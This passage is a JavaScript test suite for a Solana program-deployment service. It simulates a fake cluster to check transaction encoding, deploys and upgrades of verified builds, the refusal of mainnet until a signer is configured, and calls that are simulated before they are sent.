import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash, createPublicKey, randomBytes, verify } from "node:crypto";
import { PGlite } from "@electric-sql/pglite";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";

// Keys are sealed with MYNT_VAULT_KEY: one for this test process only.
process.env.MYNT_VAULT_KEY = randomBytes(32).toString("base64");

const { BuildService, buildConfigFromEnv } = await import("../dist/builds.js");
const { createServer } = await import("../dist/server.js");
const { Store } = await import("../dist/store.js");
const { open } = await import("../dist/vault.js");
const { SolanaService, programEvents, eventName } = await import("../dist/solana/service.js");
const { GENESIS_HASH, HttpSolanaRpc } = await import("../dist/solana/rpc.js");
const codec = await import("../dist/solana/codec.js");
const { UPGRADEABLE_LOADER, SYSTEM_PROGRAM, SYSVAR_RECENT_BLOCKHASHES, WRITE_CHUNK } = await import("../dist/solana/tx.js");
const { SOLANA_TOOLCHAIN, SOLANA_TOOLCHAIN_SCRIPT, SOLANA_VERIFY_SCRIPT } = await import("../dist/solana/toolchain.js");
const { VERIFY_SCRIPT } = await import("../dist/verify-script.js");
const { CATALOG } = await import("./helpers.js");

const { base58Encode, base58Decode, findProgramAddress, anchorDiscriminator, executableHash } = codec;

// ---- a fake Solana cluster: it parses and signature-checks every transaction and applies what the system
// program and the upgradeable loader would do, so the deployer is tested against the wire format itself. ----

function readShortVec(b, o) {
  let n = 0;
  let shift = 0;
  for (;;) {
    const x = b[o++];
    n |= (x & 0x7f) << shift;
    if (!(x & 0x80)) return [n, o];
    shift += 7;
  }
}

function parseTx(wire) {
  let [nsig, o] = readShortVec(wire, 0);
  const sigs = [];
  for (let i = 0; i < nsig; i++, o += 64) sigs.push(wire.subarray(o, o + 64));
  const message = wire.subarray(o);
  const [numSigners, roSigned, roUnsigned] = message;
  let p = 3;
  let nkeys;
  [nkeys, p] = readShortVec(message, p);
  const keys = [];
  for (let i = 0; i < nkeys; i++, p += 32) keys.push(base58Encode(message.subarray(p, p + 32)));
  const blockhash = base58Encode(message.subarray(p, p + 32));
  p += 32;
  let nix;
  [nix, p] = readShortVec(message, p);
  const ixs = [];
  for (let i = 0; i < nix; i++) {
    const program = keys[message[p++]];
    let na;
    [na, p] = readShortVec(message, p);
    const accounts = [...message.subarray(p, p + na)].map((k) => keys[k]);
    p += na;
    let nd;
    [nd, p] = readShortVec(message, p);
    ixs.push({ program, accounts, data: Buffer.from(message.subarray(p, p + nd)) });
    p += nd;
  }
  const signers = keys.slice(0, numSigners);
  const writable = new Set(keys.filter((_, i) => (i < numSigners ? i < numSigners - roSigned : i < nkeys - roUnsigned)));
  return { sigs, message, keys, signers, writable, ixs, blockhash };
}

const edKey = (address) => createPublicKey({ key: { kty: "OKP", crv: "Ed25519", x: Buffer.from(base58Decode(address)).toString("base64url") }, format: "jwk" });

class FakeCluster {
  constructor(genesis) {
    this.genesis = genesis;
    this.withhold = () => false; // a transaction that lands but whose confirmation Mynt never sees
    this.accounts = new Map();
    this.history = []; // newest last: { signature, slot, keys, logs, err }
    this.sent = []; // every transaction sent: { signature, signers, ixs }
    this.statuses = new Map();
    this.slot = 100;
    this.calls = [];
    this.simulateFails = false;
    this.nonceAdvances = 0;
    this.recent = new Set(); // blockhashes still valid
  }
  // Time passes (a slow approval): every blockhash handed out so far expires.
  expireBlockhashes() {
    this.recent.clear();
  }
  fund(address, lamports) {
    const a = this.accounts.get(address) ?? { lamports: 0, owner: SYSTEM_PROGRAM, data: Buffer.alloc(0) };
    a.lamports += lamports;
    this.accounts.set(address, a);
  }
  rent(size) {
    return (size + 128) * 6960;
  }
  debit(address, lamports) {
    const a = this.accounts.get(address);
    if (!a || a.lamports < lamports) throw new Error(`insufficient funds in ${address}`);
    a.lamports -= lamports;
  }
  apply(tx) {
    const { signers, ixs, keys } = tx;
    const signed = new Set(signers);
    this.debit(keys[0], 5000 * signers.length);
    const logs = [];
    for (const ix of ixs) {
      const tag = ix.data.length >= 4 ? ix.data.readUInt32LE(0) : -1;
      if (ix.program === SYSTEM_PROGRAM && tag === 0) {
        const [from, to] = ix.accounts;
        assert.ok(signed.has(from) && signed.has(to), "create-account needs both signatures");
        if (this.accounts.get(to)?.data.length || this.accounts.get(to)?.lamports) throw new Error(`account ${to} already in use`);
        const lamports = Number(ix.data.readBigUInt64LE(4));
        const space = Number(ix.data.readBigUInt64LE(12));
        this.debit(from, lamports);
        this.accounts.set(to, { lamports, owner: base58Encode(ix.data.subarray(20, 52)), data: Buffer.alloc(space) });
      } else if (ix.program === SYSTEM_PROGRAM && tag === 2) {
        const [from, to] = ix.accounts;
        assert.ok(signed.has(from));
        const lamports = Number(ix.data.readBigUInt64LE(4));
        this.debit(from, lamports);
        this.fund(to, lamports);
      } else if (ix.program === SYSTEM_PROGRAM && tag === 8) {
        const a = this.accounts.get(ix.accounts[0]);
        assert.ok(signed.has(ix.accounts[0]) && !a.data.length && a.owner === SYSTEM_PROGRAM);
        a.data = Buffer.alloc(Number(ix.data.readBigUInt64LE(4)));
      } else if (ix.program === SYSTEM_PROGRAM && tag === 1) {
        const a = this.accounts.get(ix.accounts[0]);
        assert.ok(signed.has(ix.accounts[0]) && a.owner === SYSTEM_PROGRAM);
        a.owner = base58Encode(ix.data.subarray(4, 36));
      } else if (ix.program === SYSTEM_PROGRAM && tag === 6) {
        // InitializeNonceAccount: [nonce, recent blockhashes sysvar, rent sysvar]; version 1, initialised, its authority, a nonce.
        const [nonce, sysvar] = ix.accounts;
        assert.equal(sysvar, SYSVAR_RECENT_BLOCKHASHES);
        const a = this.accounts.get(nonce);
        assert.ok(a && a.owner === SYSTEM_PROGRAM && a.data.length === 80 && a.data.readUInt32LE(4) === 0, "a fresh 80-byte system account");
        a.data.writeUInt32LE(1, 0);
        a.data.writeUInt32LE(1, 4);
        ix.data.subarray(4, 36).copy(a.data, 8);
        randomBytes(32).copy(a.data, 40);
      } else if (ix.program === SYSTEM_PROGRAM && tag === 4) {
        // AdvanceNonceAccount: [nonce, recent blockhashes sysvar, authority (signs)]; first in its transaction,
        // whose blockhash must be the stored nonce. Then the nonce moves.
        const [nonce, sysvar, authority] = ix.accounts;
        assert.equal(sysvar, SYSVAR_RECENT_BLOCKHASHES);
        assert.equal(tx.ixs[0], ix, "AdvanceNonceAccount comes first");
        const a = this.accounts.get(nonce);
        assert.ok(a && a.data.readUInt32LE(4) === 1, "an initialised nonce account");
        assert.ok(signed.has(authority) && base58Encode(a.data.subarray(8, 40)) === authority, "the nonce's authority signs");
        if (base58Encode(a.data.subarray(40, 72)) !== tx.blockhash) throw new Error("Blockhash not found (the nonce has moved)");
        randomBytes(32).copy(a.data, 40);
        this.nonceAdvances++;
      } else if (ix.program === UPGRADEABLE_LOADER) {
        if (tag === 0) {
          const buf = this.accounts.get(ix.accounts[0]);
          buf.data.writeUInt32LE(1, 0);
          buf.data[4] = 1;
          Buffer.from(base58Decode(ix.accounts[1])).copy(buf.data, 5);
        } else if (tag === 1) {
          const [bufAddr, authority] = ix.accounts;
          const buf = this.accounts.get(bufAddr);
          assert.ok(signed.has(authority), "write needs the buffer's authority");
          assert.equal(base58Encode(buf.data.subarray(5, 37)), authority);
          const offset = ix.data.readUInt32LE(4);
          const len = Number(ix.data.readBigUInt64LE(8));
          ix.data.subarray(16, 16 + len).copy(buf.data, 37 + offset);
        } else if (tag === 2) {
          const [payer, programData, program, bufAddr, , , , authority] = ix.accounts;
          assert.ok(signed.has(authority) && signed.has(payer));
          assert.equal(findProgramAddress([base58Decode(program)], UPGRADEABLE_LOADER)[0], programData);
          const maxLen = Number(ix.data.readBigUInt64LE(4));
          const buf = this.accounts.get(bufAddr);
          assert.equal(base58Encode(buf.data.subarray(5, 37)), authority, "the loader deploys only a buffer whose authority is the upgrade authority");
          const code = buf.data.subarray(37);
          assert.ok(code.length <= maxLen);
          const data = Buffer.alloc(45 + maxLen);
          data.writeUInt32LE(3, 0);
          data[12] = 1;
          Buffer.from(base58Decode(authority)).copy(data, 13);
          code.copy(data, 45);
          this.debit(payer, this.rent(data.length));
          this.accounts.set(programData, { lamports: this.rent(data.length), owner: UPGRADEABLE_LOADER, data });
          this.accounts.get(payer).lamports += buf.lamports;
          this.accounts.delete(bufAddr);
          const prog = this.accounts.get(program);
          assert.equal(prog.owner, UPGRADEABLE_LOADER);
          assert.ok(prog.lamports >= this.rent(36), "the program account is rent-exempt");
          prog.executable = true;
          prog.data.writeUInt32LE(2, 0);
          Buffer.from(base58Decode(programData)).copy(prog.data, 4);
        } else if (tag === 3) {
          const [programData, , bufAddr, spill, , , authority] = ix.accounts;
          const pd = this.accounts.get(programData);
          assert.ok(signed.has(authority));
          assert.equal(base58Encode(pd.data.subarray(13, 45)), authority, "only the upgrade authority upgrades");
          assert.equal(base58Encode(this.accounts.get(bufAddr).data.subarray(5, 37)), authority, "the buffer's authority must be the upgrade authority");
          const code = this.accounts.get(bufAddr).data.subarray(37);
          assert.ok(code.length <= pd.data.length - 45);
          pd.data.fill(0, 45);
          code.copy(pd.data, 45);
          this.accounts.get(spill).lamports += this.accounts.get(bufAddr).lamports;
          this.accounts.delete(bufAddr);
        } else if (tag === 4) {
          // SetAuthority on a buffer: signed by its current authority; a buffer always keeps one.
          const [bufAddr, current, next] = ix.accounts;
          const buf = this.accounts.get(bufAddr);
          assert.ok(buf && buf.data.readUInt32LE(0) === 1, "set-authority here is only ever on a buffer");
          assert.ok(signed.has(current) && base58Encode(buf.data.subarray(5, 37)) === current, "only the buffer's authority hands it over");
          assert.ok(next, "a buffer's authority can't be removed");
          Buffer.from(base58Decode(next)).copy(buf.data, 5);
        } else if (tag === 5) {
          const [bufAddr, recipient, authority] = ix.accounts;
          const buf = this.accounts.get(bufAddr);
          if (buf) assert.ok(signed.has(authority) && base58Encode(buf.data.subarray(5, 37)) === authority, "only the buffer's authority closes it");
          this.accounts.get(recipient).lamports += this.accounts.get(bufAddr)?.lamports ?? 0;
          this.accounts.delete(bufAddr);
        } else throw new Error(`loader instruction ${tag}`);
      } else {
        // A developer's program: `record` logs an Anchor event, as the template does.
        logs.push(`Program ${ix.program} invoke [1]`);
        if (ix.data.subarray(0, 8).equals(Buffer.from(anchorDiscriminator("global", "record"))))
          logs.push(`Program data: ${Buffer.concat([Buffer.from(anchorDiscriminator("event", "EntryRecorded")), ix.data.subarray(8)]).toString("base64")}`);
        logs.push(`Program ${ix.program} success`);
      }
    }
    return logs;
  }
  // A transaction some other client sent to a program: what the indexer reads back.
  record(programId, logs, err = null) {
    const signature = base58Encode(randomBytes(64));
    this.history.push({ signature, slot: ++this.slot, keys: [programId], logs, err });
    return signature;
  }
  async call(method, params = []) {
    this.calls.push(method);
    switch (method) {
      case "getGenesisHash":
        return this.genesis;
      case "getLatestBlockhash": {
        const blockhash = base58Encode(randomBytes(32));
        this.recent.add(blockhash);
        return { value: { blockhash, lastValidBlockHeight: 1000 } };
      }
      case "getProgramAccounts": {
        // The loader's accounts matching every memcmp filter (bytes in base58), as the RPC serves them.
        const [owner, o] = params;
        return [...this.accounts.entries()]
          .filter(([, a]) => a.owner === owner)
          .filter(([, a]) => (o.filters ?? []).every((f) => Buffer.from(base58Decode(f.memcmp.bytes)).equals(a.data.subarray(f.memcmp.offset, f.memcmp.offset + base58Decode(f.memcmp.bytes).length))))
          .map(([pubkey, a]) => ({ pubkey, account: { lamports: a.lamports, owner: a.owner, data: ["", "base64"] } }));
      }
      case "getMinimumBalanceForRentExemption":
        return this.rent(params[0]);
      case "getBalance":
        return { value: this.accounts.get(params[0])?.lamports ?? 0 };
      case "requestAirdrop": {
        this.fund(params[0], params[1]);
        const sig = base58Encode(randomBytes(64));
        this.statuses.set(sig, { confirmationStatus: "confirmed", err: null });
        return sig;
      }
      case "getAccountInfo": {
        const a = this.accounts.get(params[0]);
        if (!a || !(a.lamports || a.data.length)) return { value: null };
        const slice = params[1]?.dataSlice;
        const data = slice ? a.data.subarray(slice.offset, slice.offset + slice.length) : a.data;
        return { value: { lamports: a.lamports, owner: a.owner, space: a.data.length, executable: !!a.executable, data: [data.toString("base64"), "base64"] } };
      }
      case "sendTransaction": {
        const wire = Buffer.from(params[0], "base64");
        assert.ok(wire.length <= 1232, `transaction of ${wire.length} bytes`);
        const tx = parseTx(wire);
        tx.signers.forEach((s, i) => assert.ok(verify(null, tx.message, edKey(s), tx.sigs[i]), `signature of ${s}`));
        // A recent blockhash (one this cluster handed out since it last expired them), or a durable nonce, which
        // AdvanceNonceAccount checks.
        const nonced = tx.ixs[0]?.program === SYSTEM_PROGRAM && tx.ixs[0].data.readUInt32LE(0) === 4;
        if (!nonced && !this.recent.has(tx.blockhash)) throw new Error("Blockhash not found");
        const signature = base58Encode(tx.sigs[0]);
        // Solana's rent rule: an account the transaction touches ends with nothing or at least its rent-exempt
        // minimum, unless it already held less and gained nothing.
        const before = new Map(tx.keys.map((k) => [k, this.accounts.get(k)?.lamports ?? 0]));
        const logs = this.apply(tx);
        for (const k of tx.keys) {
          const a = this.accounts.get(k);
          if (!a || !a.lamports || a.executable || a.lamports >= this.rent(a.data.length)) continue;
          const was = before.get(k);
          if (!(was > 0 && was < this.rent(a.data.length) && a.lamports <= was)) throw new Error(`Transaction results in an account (${k}) with insufficient funds for rent`);
        }
        this.sent.push({ signature, signers: tx.signers, ixs: tx.ixs });
        this.history.push({ signature, slot: ++this.slot, keys: tx.keys, logs, err: null });
        if (!this.withhold(tx)) this.statuses.set(signature, { confirmationStatus: "confirmed", err: null });
        return signature;
      }
      case "getSignatureStatuses":
        return { value: params[0].map((s) => this.statuses.get(s) ?? null) };
      case "simulateTransaction": {
        const tx = parseTx(Buffer.from(params[0], "base64"));
        assert.equal(params[1].sigVerify, false);
        if (this.simulateFails) return { value: { err: { InstructionError: [0, { Custom: 6000 }] }, logs: ["Program log: AnchorError: refused"], unitsConsumed: 1200 } };
        return { value: { err: null, logs: [`Program ${tx.ixs[0].program} invoke [1]`, `Program ${tx.ixs[0].program} success`], unitsConsumed: 3400 } };
      }
      case "getSignaturesForAddress": {
        const [address, o] = params;
        let list = this.history.filter((h) => h.keys.includes(address)).reverse();
        const until = o.until ? list.findIndex((h) => h.signature === o.until) : -1;
        if (until >= 0) list = list.slice(0, until);
        if (o.before) list = list.slice(list.findIndex((h) => h.signature === o.before) + 1);
        return list.slice(0, o.limit).map((h) => ({ signature: h.signature, slot: h.slot, err: h.err }));
      }
      case "getTransaction": {
        const h = this.history.find((x) => x.signature === params[0]);
        return h ? { slot: h.slot, meta: { err: h.err, logMessages: h.logs } } : null;
      }
      default:
        throw new Error(`fake cluster: ${method}`);
    }
  }
}

// ---- the world: a store, users, a verified build, Mynt's Solana service on fake clusters ----

async function world({ mainnetUrl = null, mainnetVaultAllowed = false, confirmTimeoutMs = 2000, custody = null } = {}) {
  const pg = new PGlite();
  const db = { query: (s, p) => pg.query(s, p), exec: (s) => pg.exec(s), close: () => pg.close() };
  const store = await Store.open(db, CATALOG);
  const builds = await BuildService.open(db, store, null, null, buildConfigFromEnv({}));
  const clusters = { devnet: new FakeCluster(GENESIS_HASH.devnet), mainnet: new FakeCluster(GENESIS_HASH.mainnet) };
  const solana = await SolanaService.open(
    db,
    store,
    { rpcUrls: { devnet: "https://api.devnet.solana.com", mainnet: mainnetUrl }, mainnetVaultAllowed, confirmTimeoutMs, pollMs: 0 },
    { rpc: (cluster) => clusters[cluster], custody },
  );
  builds.solana = solana;
  const responses = [];
  const connect = async (user) => {
    const [c, s] = InMemoryTransport.createLinkedPair();
    await createServer(store, user, { builds, solana }).connect(s);
    const client = new Client({ name: "test", version: "0" });
    await client.connect(c);
    return client;
  };
  const call = async (client, name, args = {}) => {
    const res = await client.callTool({ name, arguments: args });
    responses.push(res.content[0].text);
    return { isError: res.isError ?? false, data: JSON.parse(res.content[0].text) };
  };
  const ok = async (client, name, args) => {
    const r = await call(client, name, args);
    assert.ok(!r.isError, `${name}: ${JSON.stringify(r.data)}`);
    return r.data;
  };
  const { user: adminUser } = await store.createUser("Ada", ["admin"]);
  const { user: devUser } = await store.createUser("Dev", ["developer"]);
  const { user: otherUser } = await store.createUser("Other", ["developer"]);
  const entity = await store.createEntity(devUser.id, { name: "Dev Ltd", registration_numbers: {}, regions: ["US"] });
  await store.setUserEntity(devUser.id, entity.id);
  devUser.entity_id = entity.id;
  await store.createFirmWebhook(devUser.id, { entity_id: entity.id, url: "https://hooks.example.com/mynt", events: ["program.deployed", "program.upgraded", "program.event"] });
  const app = await store.createApp(devUser.id, { name: "Ledger", description: "A ledger", audience: "Firms", product_ids: [] });
  // A build Mynt verified, and what its verification built.
  const build = async (developer = devUser, status = "succeeded") => {
    const b = await builds.start(developer, { goal: "Build the ledger program", app_id: app.id });
    await db.query("UPDATE financial_products.build_runs SET status = $2 WHERE id = $1", [b.id, status]);
    return b.id;
  };
  const program = (size = 5000, seed = 1) => {
    const bytes = Buffer.alloc(size);
    for (let i = 0; i < size - 64; i++) bytes[i] = (i * 31 + seed) % 251 || 1;
    Buffer.from([0x7f, 0x45, 0x4c, 0x46]).copy(bytes); // an ELF file, as a Solana program is
    return new Uint8Array(bytes); // trailing zero padding, as an ELF often has
  };
  return {
    db, store, builds, solana, clusters, connect, call, ok, responses, app, build, program,
    admin: await connect(adminUser), dev: await connect(devUser), other: await connect(otherUser),
    adminUser, devUser, otherUser, entity,
  };
}

const deliveries = async (w, type) =>
  (await w.db.query("SELECT payload, sandbox FROM financial_products.webhook_deliveries WHERE type = $1 ORDER BY created_at", [type])).rows;

test("codec: base58, program addresses, discriminators and the executable hash match Solana's", () => {
  assert.equal(base58Encode(Uint8Array.from([0, 0, 1, 2, 3])), "11Ldp");
  assert.deepEqual([...base58Decode("11Ldp")], [0, 0, 1, 2, 3]);
  assert.equal(base58Encode(new Uint8Array(32)), SYSTEM_PROGRAM);
  // Vectors from @solana/web3.js: the program data address of a program, and a PDA with a bump below 255.
  assert.deepEqual(findProgramAddress([base58Decode("EsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME")], UPGRADEABLE_LOADER), PDA_VECTOR);
  assert.deepEqual(findProgramAddress([Buffer.from("ledger")], "HJx8vD5GCm2j31s1ThrpmV6vGvS9xmjEuDAJJk5m8Qyw"), ["21dkbefFeE3FbGkfiBe49aMKZvD8FJEUFrpMsyycQsAF", 253]);
  // Anchor's `initialize` discriminator is [175, 175, 109, 31, 13, 152, 155, 237].
  assert.deepEqual([...anchorDiscriminator("global", "initialize")], [175, 175, 109, 31, 13, 152, 155, 237]);
  const kp = codec.Keypair.generate();
  const again = codec.Keypair.fromSecret(kp.secret());
  assert.equal(again.address, kp.address);
  assert.throws(() => codec.Keypair.fromSecret(Uint8Array.from([...kp.secret().subarray(0, 32), ...codec.Keypair.generate().publicKey])), /doesn't match/);
  assert.equal(executableHash(Uint8Array.from([1, 2, 0, 0])), createHash("sha256").update(Buffer.from([1, 2])).digest("hex"));
  assert.ok(WRITE_CHUNK > 1000 && WRITE_CHUNK < 1232);
});

test("devnet deploy: Mynt deploys the program it built, records it and its hash, and tells the firm", async () => {
  const w = await world();
  const reserved = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "devnet", app_id: w.app.id });
  assert.equal(reserved.status, "reserved");
  assert.match(reserved.next, new RegExp(`declare_id!\\("${reserved.program_id}"\\)`));
  assert.equal(reserved.programdata_address, findProgramAddress([base58Decode(reserved.program_id)], UPGRADEABLE_LOADER)[0]);

  // A build of the app now gets the toolchain and the reserved address in its spec.
  const buildId = await w.build();
  assert.equal((await w.builds.get(buildId)).solana, true);

  // Only a verified build's artifact, and only one declaring the reserved address, can be deployed.
  const code = w.program(5000);
  await w.solana.recordArtifacts(buildId, [{ name: "mynt_program", declared_id: "EsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME", sha256: executableHash(code), size: code.length, program: code, idl: null }]);
  let r = await w.call(w.dev, "deploy_program", { program_id: reserved.program_id, build_id: buildId });
  assert.ok(r.isError);
  assert.match(r.data.error, /declares/);
  await w.solana.recordArtifacts(buildId, [{ name: "mynt_program", declared_id: reserved.program_id, sha256: executableHash(code), size: code.length, program: code, idl: { events: [{ name: "EntryRecorded" }] } }]);
  // A hash Mynt's own reading doesn't reproduce isn't kept.
  assert.deepEqual(await w.solana.recordArtifacts(buildId, [{ name: "evil", declared_id: reserved.program_id, sha256: "0".repeat(64), reported_sha256: "0".repeat(64), size: code.length, program: code, idl: null }]), []);
  const failing = await w.build(w.devUser, "failed");
  r = await w.call(w.dev, "deploy_program", { program_id: reserved.program_id, build_id: failing });
  assert.match(r.data.error, /only a build Mynt verified/);
  const othersBuild = await w.build(w.otherUser);
  r = await w.call(w.dev, "deploy_program", { program_id: reserved.program_id, build_id: othersBuild });
  assert.match(r.data.error, /No build of yours/);

  const started = await w.ok(w.dev, "deploy_program", { program_id: reserved.program_id, build_id: buildId });
  assert.equal(started.status, "deploying");
  await w.solana.settled(reserved.program_id);
  const p = await w.ok(w.dev, "get_program", { program_id: reserved.program_id });
  assert.equal(p.status, "deployed", p.error);
  assert.equal(p.version, 1);
  assert.equal(p.verifiable_hash, executableHash(code));
  assert.equal(p.signer_backend, "devnet-vault");
  assert.equal(p.upgrade_authority, p.deployer);
  assert.equal(p.versions.length, 1);
  assert.equal(p.versions[0].build_id, buildId);

  // On chain: exactly Mynt's bytes, the upgrade authority Mynt's devnet key, paid for by the faucet.
  const chain = w.clusters.devnet;
  const pd = chain.accounts.get(p.programdata_address);
  assert.ok(pd.data.subarray(45, 45 + code.length).equals(Buffer.from(code)));
  assert.equal(executableHash(pd.data.subarray(45)), p.verifiable_hash, "the on-chain bytes hash like the build");
  assert.equal(base58Encode(pd.data.subarray(13, 45)), p.upgrade_authority);
  assert.ok(chain.accounts.get(p.program_id).executable);
  assert.ok(chain.calls.includes("requestAirdrop"));
  assert.equal(chain.sent.filter((t) => t.ixs.some((i) => i.program === UPGRADEABLE_LOADER && i.data.readUInt32LE(0) === 1)).length, Math.ceil(code.length / WRITE_CHUNK));
  // The program's own keypair did its one job and is gone from the vault.
  assert.equal((await w.db.query("SELECT 1 FROM financial_products.solana_keys WHERE role = 'program'")).rows.length, 0);

  const sent = await deliveries(w, "program.deployed");
  assert.equal(sent.length, 1);
  assert.equal(sent[0].payload.data.program_id, reserved.program_id);
  assert.equal(sent[0].sandbox, true, "devnet events are sandbox data");

  r = await w.call(w.dev, "deploy_program", { program_id: reserved.program_id, build_id: buildId });
  assert.match(r.data.error, /upgrade_program/);
  r = await w.call(w.other, "get_program", { program_id: reserved.program_id });
  assert.match(r.data.error, /No program of yours/);
});

test("upgrade: a newer verified build replaces the code at the same address; the same code or too much is refused", async () => {
  const w = await world();
  const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "devnet" });
  const record = async (buildId, code) =>
    w.solana.recordArtifacts(buildId, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code), size: code.length, program: code, idl: null }]);
  const v1 = await w.build();
  const code1 = w.program(3000, 1);
  await record(v1, code1);
  await w.ok(w.dev, "deploy_program", { program_id, build_id: v1 });
  await w.solana.settled(program_id);

  let r = await w.call(w.dev, "upgrade_program", { program_id, build_id: v1 });
  assert.match(r.data.error, /already deployed/);
  const big = await w.build();
  await record(big, w.program(7000, 3));
  await w.ok(w.dev, "upgrade_program", { program_id, build_id: big });
  await w.solana.settled(program_id);
  let p = await w.ok(w.dev, "get_program", { program_id });
  assert.match(p.error, /larger than the 6000 bytes reserved/);
  assert.equal(p.version, 1);

  const v2 = await w.build();
  const code2 = w.program(4000, 2);
  await record(v2, code2);
  await w.ok(w.dev, "upgrade_program", { program_id, build_id: v2 });
  await w.solana.settled(program_id);
  p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "deployed");
  assert.equal(p.version, 2);
  assert.equal(p.verifiable_hash, executableHash(code2));
  assert.deepEqual(p.versions.map((v) => v.action), ["deploy", "upgrade"]);
  const pd = w.clusters.devnet.accounts.get(p.programdata_address);
  assert.equal(executableHash(pd.data.subarray(45)), executableHash(code2));
  assert.equal((await deliveries(w, "program.upgraded")).length, 1);
});

test("mainnet is refused until an admin configures and enables a ready signer; then mainnet-vault deploys", async () => {
  const blocked = await world();
  const { program_id: blockedId } = await blocked.ok(blocked.dev, "reserve_program_id", { name: "mynt_program", cluster: "mainnet" });
  const b0 = await blocked.build();
  const c0 = blocked.program(2000);
  await blocked.solana.recordArtifacts(b0, [{ name: "mynt_program", declared_id: blockedId, sha256: executableHash(c0), size: c0.length, program: c0, idl: null }]);
  let r = await blocked.call(blocked.dev, "deploy_program", { program_id: blockedId, build_id: b0 });
  assert.match(r.data.error, /^Mainnet signer not configured: .*SOLANA_RPC_URL_MAINNET.*no mainnet signer backend.*hasn't enabled mainnet/);
  // The vault backend chosen and a key generated, but the server doesn't allow mainnet keys in the vault.
  const configured = await blocked.ok(blocked.admin, "configure_solana_signer", { backend: "mainnet-vault", generate_key: true, enabled: true });
  assert.match(configured.generated_authority, /^[1-9A-HJ-NP-Za-km-z]{32,44}$/);
  assert.equal(configured.mainnet.ready, false);
  r = await blocked.call(blocked.dev, "deploy_program", { program_id: blockedId, build_id: b0 });
  assert.match(r.data.error, /SOLANA_MAINNET_VAULT_SIGNER/);
  assert.equal(blocked.clusters.mainnet.calls.length, 0, "nothing reached mainnet");
  // Custody and multisig backends refuse plainly while nothing is connected.
  await blocked.ok(blocked.admin, "configure_solana_signer", { backend: "custody-service", custody_provider: "turnkey", custody_address: configured.generated_authority });
  r = await blocked.call(blocked.dev, "deploy_program", { program_id: blockedId, build_id: b0 });
  assert.match(r.data.error, /Mainnet signer not configured: .*no custody provider is connected/);
  await blocked.ok(blocked.admin, "configure_solana_signer", { backend: "multisig", multisig_address: blockedId, multisig_vault: configured.generated_authority });
  r = await blocked.call(blocked.dev, "deploy_program", { program_id: blockedId, build_id: b0 });
  assert.match(r.data.error, /Mainnet signer not configured: .*no multisig client is connected/);

  // Ready: the RPC set, the vault allowed, the key generated, the backend chosen, mainnet enabled.
  const w = await world({ mainnetUrl: "https://rpc.example.com", mainnetVaultAllowed: true });
  const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "mainnet" });
  const b = await w.build();
  const code = w.program(2000);
  await w.solana.recordArtifacts(b, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code), size: code.length, program: code, idl: null }]);
  r = await w.call(w.dev, "deploy_program", { program_id, build_id: b });
  assert.match(r.data.error, /hasn't enabled mainnet/);
  const ready = await w.ok(w.admin, "configure_solana_signer", { backend: "mainnet-vault", generate_key: true, enabled: true });
  assert.equal(ready.mainnet.ready, true, JSON.stringify(ready.mainnet.missing));
  assert.match(ready.funding, /Fund /);
  // Unfunded: mainnet has no faucet, so it says who must fund what.
  await w.ok(w.dev, "deploy_program", { program_id, build_id: b });
  await w.solana.settled(program_id);
  let p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "failed");
  assert.match(p.error, /needs .* SOL; the operator funds it/);
  assert.ok(!w.clusters.mainnet.calls.includes("requestAirdrop"));
  w.clusters.mainnet.fund(ready.mainnet.authority, 10_000_000_000);
  await w.ok(w.dev, "deploy_program", { program_id, build_id: b });
  await w.solana.settled(program_id);
  p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "deployed", p.error);
  assert.equal(p.signer_backend, "mainnet-vault");
  assert.equal(p.upgrade_authority, ready.mainnet.authority);
  assert.equal((await deliveries(w, "program.deployed"))[0].sandbox, false, "mainnet events are live data");
  // Turned off again: everything on mainnet stops.
  await w.ok(w.admin, "configure_solana_signer", { enabled: false });
  r = await w.call(w.dev, "call_program", { program_id, instruction: { method: "record", accounts: [] } });
  assert.match(r.data.error, /Mainnet signer not configured/);
});

test("calls: simulated first and sent only if that succeeds, signed by the developer's caller key, never the deploy authority", async () => {
  const w = await world();
  const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "devnet" });
  let r = await w.call(w.dev, "simulate_program_call", { program_id, instruction: { method: "record", accounts: [] } });
  assert.match(r.data.error, /only a deployed program/);
  const b = await w.build();
  const code = w.program(1500);
  await w.solana.recordArtifacts(b, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code), size: code.length, program: code, idl: null }]);
  await w.ok(w.dev, "deploy_program", { program_id, build_id: b });
  await w.solana.settled(program_id);
  const p = await w.ok(w.dev, "get_program", { program_id });
  const chain = w.clusters.devnet;
  const instruction = { method: "record", args_base64: Buffer.alloc(40, 1).toString("base64"), accounts: [{ pubkey: "$caller", signer: true }] };

  const sim = await w.ok(w.dev, "simulate_program_call", { program_id, instruction });
  assert.equal(sim.ok, true);
  assert.notEqual(sim.caller, p.upgrade_authority, "calls sign with a key of the developer's own");
  assert.notEqual(sim.fee_payer, sim.caller, "fees come from a key no program sees");

  chain.simulateFails = true;
  const before = chain.sent.length;
  const refused = await w.ok(w.dev, "call_program", { program_id, instruction });
  assert.equal(refused.sent, false);
  assert.match(refused.simulation.logs.join("\n"), /refused/);
  assert.equal(chain.sent.length, before, "a failing simulation sends nothing");

  chain.simulateFails = false;
  const sent = await w.ok(w.dev, "call_program", { program_id, instruction });
  assert.equal(sent.sent, true);
  const tx = chain.sent.find((t) => t.signature === sent.signature);
  assert.deepEqual(tx.signers, [sim.fee_payer, sim.caller]);
  assert.ok(!tx.ixs[0].accounts.includes(sim.fee_payer), "the program never sees the fee payer");
  // $caller signs only when the call lists it.
  const unsigned = await w.ok(w.dev, "call_program", { program_id, instruction: { method: "record", accounts: [{ pubkey: sim.caller }] } });
